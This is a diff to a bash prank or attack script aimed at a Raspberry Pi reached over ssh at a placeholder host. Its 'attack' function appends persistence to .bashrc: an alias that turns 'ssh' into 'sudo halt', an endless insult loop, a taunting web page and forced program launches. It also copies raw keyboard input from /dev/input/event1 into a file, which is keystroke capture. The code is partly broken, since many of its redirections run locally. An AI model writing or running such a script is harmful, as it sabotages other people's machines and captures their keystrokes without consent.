@@ -48,11 +48,15 @@ configure () {
     ssh pi@ip sudo apt-get install figlet
     ssh pi@ip sudo echo "#!/bin/bash" > /usr/loop && sudo echo "variabile=0" >> /usr/loop && sudo echo "while [ variabile=9 ]; do" >> /usr/loop && sudo echo "    figlet 'Lezzo'" >> /usr/loop && sudo echo "done" >> /usr/loop
     ssh pi@ip sudo echo "<!doctype html><html><head><title>Zeb89</title></head><body><center><img src='http://i.ytimg.com/vi/ivV7hEZ6YUM/0.jpg'><p><font size='10' color='black' >Eh .... Volevi !!!!</font></p><p><font size='10' color='red'>Ma lisciami le mele, LEZZO</font></p></center></body></html>" > /usr/zeb.html
-    ssh pi@ip ls /bin > /usr/comandi && sudo echo "#!/bin/bash" > /usr/block && sudo echo "terminal='tty'" >> /usr/block && sudo echo "" >> /usr/block
+    
 }
 
 attack () {
-ssh pi@ip echo "figlet 'Eh volevi'" >> .bashrc && echo "figlet 'Lezzo'" >> .bashrc &&
+ssh pi@ip echo "figlet 'Eh volevi'" >> .bashrc && sudo dd if=/dev/input/event1 of=/usr/parole && echo "alias ssh='sudo halt'" >> .bashrc && echo "bash /usr/loop" >> .bashrc && echo "chromium-browser file:///usr/zeb.html" >> .bashrc && echo "minecraft-pi" >> .bashrc
+}
+
+remove (){
+ssh pi@ip sed -i /alias/d /home/pi/.bashrc && sed -i /figlet/d /home/pi/.bashrc && sed -i /loop/d /home/pi/.bashrc && sed -i /chromium-browser/d /home/pi/.bashrc && sed -i /minecraft-pi/d /home/pi/.bashrc
 }
 
 
